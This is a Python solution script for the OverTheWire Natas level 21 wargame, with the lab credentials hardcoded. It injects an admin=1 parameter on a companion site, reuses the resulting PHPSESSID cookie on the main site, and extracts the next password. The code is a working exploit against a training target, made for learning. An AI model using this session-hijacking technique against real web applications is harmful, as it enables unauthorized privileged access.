#!/usr/bin/env python3
'''
Level 21 → Level 22
Cross-site Session Hijacking : Python Web Hacking
https://github.com/psmiraglia/ctf/blob/master/overthewire/natas/natas21.md
github.com/JohnHammond/overthewire_natas_solutions/blob/master/natas21.py
https://www.youtube.com/watch?v=iFgQyI3Vfag&list=PL1H1sBF1VAKWM3wMCn6H5Ql6OrgIivt2V&index=19

Username: natas21
URL:      http://natas21.natas.labs.overthewire.org
username = 'natas21'
password = 'IFekPyrQXftziDEsUr3x21sYuahypdgJ'
problem:


write up:


'''
import requests
import re
target = 'http://natas21-experimenter.natas.labs.overthewire.org'
auth = ('natas21', 'IFekPyrQXftziDEsUr3x21sYuahypdgJ')

params = dict(debug='', submit='', admin=1)
#                                  ^^^^^^^ <- this is the trick
cookies = dict()
r = requests.get(target, auth=auth, params=params, cookies=cookies)
phpsessid = r.cookies['PHPSESSID']
print (r.text)

target = 'http://natas21.natas.labs.overthewire.org'
params = dict(debug='')
cookies = dict(PHPSESSID=phpsessid)
r = requests.get(target, auth=auth, params=params, cookies=cookies)
print(r.text)
print ("\nPassword for natas21 = ", re.findall('Password: (.*)',r.text)[0])
